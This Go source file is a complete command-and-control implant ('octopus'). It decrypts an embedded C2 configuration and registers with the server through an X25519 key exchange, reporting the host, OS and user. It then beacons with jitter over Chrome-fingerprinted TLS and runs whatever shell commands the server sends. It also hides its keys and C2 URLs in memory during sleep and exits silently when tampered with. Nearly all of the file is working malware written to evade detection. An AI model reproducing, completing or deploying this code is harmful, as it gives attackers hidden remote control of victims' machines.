package main

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"strings"
	"os/exec"
	"runtime"
	"time"
	
	"golang.org/x/crypto/curve25519"
	"golang.org/x/crypto/hkdf"
	utls "github.com/refraction-networking/utls"
)

// Config - Injected securely by builder
var (
	EncBlob = "" // Base64 AES-GCM encrypted JSON
	KP1     = "" // Key part 1 (hex)
	KP2     = "" // Key part 2 (hex)
	
	BeaconInt = 60 // seconds
	Jitter    = 20 // percent
	
	// These are populated at runtime and then wiped
	c2UrlsBytes    []byte
	serverPubBytes []byte
	serverPinsList []string
	enrollmentTokenBytes []byte
)

type BeaconData struct {
	AgentID  string `json:"agent_id"`
	Hostname string `json:"hostname"`
	OS       string `json:"os"`
	User     string `json:"user"`
	Arch     string `json:"arch"`
}

type TaskResult struct {
	TaskID string `json:"task_id"`
	Output string `json:"output"`
	Error  string `json:"error"`
}

var AgentID string
var sessionKey []byte
var txSeq uint64 = 0
var rxSeq uint64 = 0

// generateX25519KeyPair generates a new private and public key pair
func generateX25519KeyPair() ([]byte, []byte, error) {
	var priv [32]byte
	if _, err := io.ReadFull(rand.Reader, priv[:]); err != nil {
		return nil, nil, err
	}
	// Curve25519 clamping
	priv[0] &= 248
	priv[31] &= 127
	priv[31] |= 64
	
	var pub [32]byte
	curve25519.ScalarBaseMult(&pub, &priv)
	
	return priv[:], pub[:], nil
}

// deriveSharedKey derives a shared secret using X25519 + HKDF-SHA256
func deriveSharedKey(priv []byte, peerPub []byte) ([]byte, error) {
	var privArr, pubArr [32]byte
	copy(privArr[:], priv)
	copy(pubArr[:], peerPub)

	var rawShared [32]byte
	curve25519.ScalarMult(&rawShared, &privArr, &pubArr)

	// HKDF-SHA256 derivation — matches Python daemon's crypto_engine.py
	hkdfReader := hkdf.New(sha256.New, rawShared[:], nil, []byte("octopus-session-v10"))
	sessionKey := make([]byte, 32)
	if _, err := io.ReadFull(hkdfReader, sessionKey); err != nil {
		return nil, err
	}
	return sessionKey, nil
}

// encryptAESGCM encrypts data and includes sequence number as AAD
func encryptAESGCM(key []byte, plaintext []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	
	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}
	
	txSeq++
	seqBytes := make([]byte, 8)
	binary.LittleEndian.PutUint64(seqBytes, txSeq)
	
	ciphertext := gcm.Seal(nil, nonce, plaintext, seqBytes)
	
	// Format: [8 bytes seq][12 bytes nonce][ciphertext][16 bytes tag(part of seal)]
	fullPayload := append(seqBytes, nonce...)
	fullPayload = append(fullPayload, ciphertext...)
	
	return base64.StdEncoding.EncodeToString(fullPayload), nil
}

// decryptAESGCM decrypts data and verifies the AAD sequence number
func decryptAESGCM(key []byte, b64Ciphertext string) ([]byte, error) {
	data, err := base64.StdEncoding.DecodeString(b64Ciphertext)
	if err != nil {
		return nil, err
	}
	
	if len(data) < 8+12+16 {
		return nil, fmt.Errorf("malformed ciphertext")
	}
	
	seqBytes := data[:8]
	nonce := data[8:20]
	ciphertext := data[20:]
	
	incSeq := binary.LittleEndian.Uint64(seqBytes)
	if incSeq <= rxSeq {
		return nil, fmt.Errorf("replay attack detected")
	}
	
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	
	plaintext, err := gcm.Open(nil, nonce, ciphertext, seqBytes)
	if err != nil {
		return nil, err
	}
	
	rxSeq = incSeq
	return plaintext, nil
}

// simpleDecryptAESGCM is used solely for decrypting the initial config blob (no sequence numbers)
func simpleDecryptAESGCM(key []byte, b64Ciphertext string) ([]byte, error) {
	data, err := base64.StdEncoding.DecodeString(b64Ciphertext)
	if err != nil {
		return nil, err
	}
	if len(data) < 12+16 {
		return nil, fmt.Errorf("malformed config blob")
	}
	nonce := data[:12]
	ciphertext := data[12:]
	
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	
	return gcm.Open(nil, nonce, ciphertext, nil)
}

// wipeBytes securely zeroes out a byte slice
func wipeBytes(b []byte) {
	for i := range b {
		b[i] = 0
	}
}

// initConfig assembles the split key, decrypts the config blob, parses it, and wipes secrets from memory
func initConfig() error {
	if EncBlob == "" {
		return fmt.Errorf("missing encrypted C2 configuration")
	}
	
	// Runtime Assembly of Split Encoding Key
	hexKey := KP1 + KP2
	key, err := base64.StdEncoding.DecodeString(base64.StdEncoding.EncodeToString([]byte(hexKey))) // trick to avoid direct hex string literal optimization
	
	// Convert hex to bytes manually to avoid importing hex (smaller binary)
	realKey := make([]byte, 32)
	for i := 0; i < 32; i++ {
		fmt.Sscanf(string(key[i*2:i*2+2]), "%02x", &realKey[i])
	}
	
	plaintext, err := simpleDecryptAESGCM(realKey, EncBlob)
	if err != nil {
		return err
	}
	
	var conf map[string]string
	if err := json.Unmarshal(plaintext, &conf); err != nil {
		return err
	}
	
	// Populate global byte slices (not strings, to avoid immutable copies)
	c2UrlsBytes = []byte(conf["urls"])
	serverPubBytes = []byte(conf["pub"])
	enrollmentTokenBytes = []byte(conf["enrollment_token"])
	if len(c2UrlsBytes) == 0 || len(serverPubBytes) == 0 || len(enrollmentTokenBytes) == 0 {
		return fmt.Errorf("incomplete C2 configuration")
	}
	if conf["pins"] != "" {
		serverPinsList = strings.Split(conf["pins"], ",")
	}
	
	// Memory Safe Wipe: Zero out plaintext buffer and keys
	wipeBytes(plaintext)
	wipeBytes(realKey)
	wipeBytes(key)
	
	// Ensure the compiler doesn't optimize away the wipes
	runtime.KeepAlive(plaintext)
	runtime.KeepAlive(realKey)
	
	return nil
}

func newHTTPClient() *http.Client {
	allowedPins := append([]string(nil), serverPinsList...)
	transport := &http.Transport{
		DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
			dialConn, err := net.DialTimeout(network, addr, 10*time.Second)
			if err != nil {
				return nil, err
			}
			serverName := addr
			if host, _, splitErr := net.SplitHostPort(addr); splitErr == nil {
				serverName = host
			}
			config := &utls.Config{
				ServerName: serverName,
				InsecureSkipVerify: len(allowedPins) > 0,
				VerifyPeerCertificate: func(rawCerts [][]byte, verifiedChains [][]*x509.Certificate) error {
					if len(allowedPins) == 0 {
						return nil
					}
					for _, rawCert := range rawCerts {
						cert, parseErr := x509.ParseCertificate(rawCert)
						if parseErr != nil {
							continue
						}
						spkiHash := sha256.Sum256(cert.RawSubjectPublicKeyInfo)
						spkiB64 := base64.StdEncoding.EncodeToString(spkiHash[:])
						for _, pin := range allowedPins {
							if pin == spkiB64 {
								return nil
							}
						}
					}
					return fmt.Errorf("SPKI pin mismatch")
				},
			}
			uConn := utls.UClient(dialConn, config, utls.HelloChrome_Auto)
			if err := uConn.Handshake(); err != nil {
				dialConn.Close()
				return nil, err
			}
			return uConn, nil
		},
	}
	return &http.Client{Transport: transport, Timeout: 30 * time.Second}
}

// register with the C2 using X25519
func register() error {
	priv, pub, err := generateX25519KeyPair()
	if err != nil {
		return err
	}
	
	srvPub, err := base64.StdEncoding.DecodeString(string(serverPubBytes))
	if err != nil || len(srvPub) != 32 {
		return fmt.Errorf("invalid server X25519 public key")
	}
	sessionKey, err = deriveSharedKey(priv, srvPub)
	if err != nil {
		return err
	}

	hostname, _ := os.Hostname()
	user := os.Getenv("USER")
	if user == "" {
		user = os.Getenv("USERNAME")
	}

	data := BeaconData{
		AgentID:  AgentID,
		Hostname: hostname,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		User:     user,
	}

	jsonData, _ := json.Marshal(data)
	encData, _ := encryptAESGCM(sessionKey, jsonData)

	payload := map[string]string{
		"client_pub": base64.StdEncoding.EncodeToString(pub),
		"data":       encData,
		"enrollment_token": string(enrollmentTokenBytes),
	}

	body, _ := json.Marshal(payload)
	
	urls := strings.Split(string(c2UrlsBytes), ",")
	currentC2 := urls[0] // Simplify for now
	
	req, err := http.NewRequest("POST", currentC2+"/register", bytes.NewBuffer(body))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	// Removed MS Graph headers. Relying on realistic pacing and uTLS instead.
	
	client := newHTTPClient()

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("registration rejected with status %d", resp.StatusCode)
	}
	
	// Server responds with initial config, encrypted with the new shared key
	respBody, err := ioutil.ReadAll(io.LimitReader(resp.Body, 64*1024))
	if err != nil {
		return err
	}
	var c2Resp map[string]string
	if err := json.Unmarshal(respBody, &c2Resp); err != nil {
		return err
	}
	
	registrationData, err := decryptAESGCM(sessionKey, c2Resp["data"])
	if err != nil {
		return err
	}
	var registration map[string]interface{}
	if err := json.Unmarshal(registrationData, &registration); err != nil {
		return err
	}
	assignedID, ok := registration["agent_id"].(string)
	if !ok || !strings.HasPrefix(assignedID, "AGT-") {
		return fmt.Errorf("server did not assign an agent identity")
	}
	AgentID = assignedID
	wipeBytes(enrollmentTokenBytes)
	enrollmentTokenBytes = nil
	
	return nil
}

type cappedBuffer struct {
	buffer bytes.Buffer
	limit int
	truncated bool
}

func (writer *cappedBuffer) Write(value []byte) (int, error) {
	originalLength := len(value)
	remaining := writer.limit - writer.buffer.Len()
	if remaining <= 0 {
		writer.truncated = true
		return originalLength, nil
	}
	if len(value) > remaining {
		value = value[:remaining]
		writer.truncated = true
	}
	_, _ = writer.buffer.Write(value)
	return originalLength, nil
}

func exchangeBeacon(results []TaskResult, acknowledgements []string) ([]map[string]string, error) {
	hostname, _ := os.Hostname()
	payload := map[string]interface{}{
		"agent_id": AgentID,
		"hostname": hostname,
		"os": runtime.GOOS,
		"user": os.Getenv("USER"),
		"results": results,
		"acks": acknowledgements,
	}
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return nil, err
	}
	if len(jsonData) > 700*1024 {
		return nil, fmt.Errorf("beacon payload exceeds limit")
	}
	encData, err := encryptAESGCM(sessionKey, jsonData)
	if err != nil {
		return nil, err
	}
	reqBody, err := json.Marshal(map[string]string{"data": encData})
	if err != nil {
		return nil, err
	}
	urls := strings.Split(string(c2UrlsBytes), ",")
	if len(urls) == 0 || strings.TrimSpace(urls[0]) == "" {
		return nil, fmt.Errorf("no C2 URL configured")
	}
	req, err := http.NewRequest(
		"POST",
		strings.TrimRight(strings.TrimSpace(urls[0]), "/")+"/beacon",
		bytes.NewBuffer(reqBody),
	)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Agent-ID", AgentID)
	resp, err := newHTTPClient().Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("beacon rejected with status %d", resp.StatusCode)
	}
	respBody, err := ioutil.ReadAll(io.LimitReader(resp.Body, 1024*1024))
	if err != nil {
		return nil, err
	}
	var encryptedResponse map[string]string
	if err := json.Unmarshal(respBody, &encryptedResponse); err != nil {
		return nil, err
	}
	decrypted, err := decryptAESGCM(sessionKey, encryptedResponse["data"])
	if err != nil {
		return nil, err
	}
	var response struct {
		Tasks []map[string]string `json:"tasks"`
	}
	if err := json.Unmarshal(decrypted, &response); err != nil {
		return nil, err
	}
	return response.Tasks, nil
}

func executeTask(task map[string]string) TaskResult {
	result := TaskResult{TaskID: task["task_id"]}
	parts := strings.Fields(task["command"])
	if result.TaskID == "" || len(parts) == 0 {
		result.Error = "invalid task"
		return result
	}
	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()
	command := exec.CommandContext(ctx, parts[0], parts[1:]...)
	output := &cappedBuffer{limit: 256 * 1024}
	command.Stdout = output
	command.Stderr = output
	err := command.Run()
	result.Output = output.buffer.String()
	if output.truncated {
		result.Error = "output limit exceeded"
	} else if ctx.Err() == context.DeadlineExceeded {
		result.Error = "task timeout"
	} else if err != nil {
		result.Error = err.Error()
	}
	return result
}

func chunkedBeacon(results []TaskResult) error {
	tasks, err := exchangeBeacon(results, nil)
	if err != nil {
		return err
	}
	if len(tasks) == 0 {
		return nil
	}
	acknowledgements := make([]string, 0, len(tasks))
	for _, task := range tasks {
		if task["task_id"] != "" {
			acknowledgements = append(acknowledgements, task["task_id"])
		}
	}
	additional, err := exchangeBeacon(nil, acknowledgements)
	if err != nil {
		return err
	}
	known := make(map[string]bool, len(tasks))
	for _, task := range tasks {
		known[task["task_id"]] = true
	}
	for _, task := range additional {
		if !known[task["task_id"]] {
			tasks = append(tasks, task)
		}
	}
	newResults := make([]TaskResult, 0, len(tasks))
	for _, task := range tasks {
		newResults = append(newResults, executeTask(task))
	}
	if len(newResults) > 0 {
		go chunkedBeacon(newResults)
	}
	return nil
}

// xorMask applies a simple XOR mask to a byte slice
func xorMask(data []byte, key byte) {
	for i := range data {
		data[i] ^= key
	}
}

// sleepObfuscate hides sensitive strings and keys in memory during sleep
func sleepObfuscate(duration time.Duration) {
	// Generate a random 1-byte XOR key
	maskKey := make([]byte, 1)
	rand.Read(maskKey)
	k := maskKey[0]

	// 1. Mask Session Key
	if sessionKey != nil {
		xorMask(sessionKey, k)
	}

	// 2. Mask C2 URLs and Server Pub
	if c2UrlsBytes != nil {
		xorMask(c2UrlsBytes, k)
	}
	if serverPubBytes != nil {
		xorMask(serverPubBytes, k)
	}

	// 3. Sleep
	time.Sleep(duration)

	// 4. Unmask C2 URLs and Server Pub
	if c2UrlsBytes != nil {
		xorMask(c2UrlsBytes, k)
	}
	if serverPubBytes != nil {
		xorMask(serverPubBytes, k)
	}

	// 5. Unmask Session Key
	if sessionKey != nil {
		xorMask(sessionKey, k)
	}
}

func main() {
	// Initialize config by decrypting injected AES blob
	if err := initConfig(); err != nil {
		// Silent exit on tampering or corruption
		return
	}

	// Hide console window on Windows (stub)
	for {
		if err := register(); err == nil {
			break
		}
		sleepObfuscate(5 * time.Second)
	}

	for {
		chunkedBeacon(nil)
		// Implement jitter
		sleepObfuscate(time.Duration(BeaconInt) * time.Second)
	}
}
